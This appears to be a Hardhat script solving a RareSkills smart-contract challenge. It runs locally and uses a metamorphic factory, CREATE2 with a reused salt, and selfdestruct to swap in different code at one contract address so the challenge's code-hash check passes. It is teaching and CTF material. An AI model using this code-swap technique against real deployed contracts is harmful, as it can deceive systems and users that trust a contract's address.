const hre = require("hardhat");
const { expect } = require("chai");

async function main() {

  console.log("\n✍ OK! Solving the Rareskills.io challenge...\n");

  [deployer] = await hre.ethers.getSigners();

  // ========= SETUP

  // Deploy the Metamorphic Factory Contract
  const MMF = await hre.ethers.getContractFactory("MetamorphicContractFactory");
  const mmf = await MMF.deploy("0x"); // note that to solve this challenge, we don't need the transient contract - so just input anything for the transient bytecode
  console.log("✅ Metamorphic Factory Contract deployed to: ", mmf.address);

  // Now deploy the challenge contract from Rareskills:
  const Challenge = await hre.ethers.getContractFactory("StrangeV4");
  const challenge = await Challenge.deploy({value: hre.ethers.utils.parseEther("1")});
  console.log("✅ Challenge deployed to: ", challenge.address);

  // then deploy the first contract with its code hash
  const ContractOne = await hre.ethers.getContractFactory("ContractOne");
  const c1 = await ContractOne.deploy();
  await c1.deployed();
  console.log("✅ Contract One deployed to: ", c1.address);

  // ========= SOLVING THE CHALLENGE

  // we are now ready to solve the challenge:

  // Firdt, deploy in a metamorphic way (aka with ability to later change the codehash but keep the address unchanged)
  // this means: deploy via the MMF:
  let salt = deployer.address.concat("000000000000000000000000"); // we concat to ensure it's 32 bytes; it's required that the first 20 bytes is the deployer address
  let receipt = await mmf.deployMetamorphicContractFromExistingImplementation(
    salt,
    c1.address, // we reference the already deployed Contract One instance here
    "0x"
  )
  // let's look in the emitted event from this to find the address of the deployed "ContractOne" (but in a metamorphic way):
  receipt = await receipt.wait();
  let firstAddress = receipt.events?.filter((x) => {return x.event == "Metamorphosed"})[0].args.metamorphicContract;
  // ^^^ this is the address of the deployed metamorphic contract.
  // we call it "first" so we can compare to the second deployment later
  
  // make sure it's as we expect:
  let contractOne = await new hre.ethers.Contract(firstAddress, c1.interface, deployer);
  expect(await contractOne.add(1)).to.equal(2); // this is the first contract - so it returns x+1 - we send in x=1 and thus we expect 2 in return

  // Now - register this with the challenge contract:
  console.log("✅ Initiate the challenge!");
  receipt = await challenge.initialize(firstAddress);
  await receipt.wait();

  // make sure that we don't complete the challenge:
  console.log("✅ Make sure we fail the challenge before calling with the strange contract");
  await expect(challenge.success(firstAddress)).to.be.revertedWith("contract isn't strange");
  // why does it revert with this reason?
  // let's look in the Challenge:
  // 
  //    require(_contract.code.length != 0, "must be a contract");
  //    require(_contract == strangeContract, "must be the same contract");
  //    require(_contract.codehash != codeHash, "contract isn't strange");
  //
  // Requirement 1: Well we will pass this when we call `success` because ContractOne at `firstAddress` is a contract
  // Requirement 2: We pass this too, since of course when calling `success` with `firstAddress`, it will be the same address as we stored when we called `initialize`
  // Requirement 3: BUT: The contract at `firstAddress` is of course the exact same code hash as the one used during `initialize`.
  // ... so to solve the challenge, we need to deploy another contract (in our case: Contract Two) with *the same address*
  // doing that now:

  // first ... kill the existing deployed ContractOne:
  receipt = await contractOne.kill();
  await receipt.wait();
  console.log("✅ Killed the first contract initially metamorphically deployed");

  // ensure that it's dead:
  await expect(contractOne.add(1)).to.be.reverted; // reverts because it's killed

  // now deploy ContractTwo via the factory
  // first, deploy ContractTwo itself:
  const ContractTwo = await hre.ethers.getContractFactory("ContractTwo");
  const c2 = await ContractTwo.deploy();
  await c2.deployed();
  console.log("✅ Contract Two deployed to: ", c2.address);
  // contract two is "x+2" (instead of "x+1")

  receipt = await mmf.deployMetamorphicContractFromExistingImplementation(
    salt, // use same salt
    c2.address, // we reference the already deployed Contract Two instance here - note: this is NOT contract one!
    "0x"
  )
  receipt = await receipt.wait();
  secondAddress = receipt.events?.filter((x) => {return x.event == "Metamorphosed"})[0].args.metamorphicContract;
  // this address better be the same as before - that's the whole point!

  expect(firstAddress).to.equal(secondAddress);
  
  // make sure it's a different code (and thus a different code hash) deployed to that address!
  expect(await contractOne.add(1)).to.equal(3); // note how it's "x+2" now!
  console.log("✅ Metamorphosis successful - contract two has same address as contract one - but a different code hash!");
  
  // now solve the challenge!
  await expect(challenge.success(firstAddress)).not.to.be.reverted;
  console.log("\n🎉🎉🎉 Challenge solved! 🎉🎉🎉\n");
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
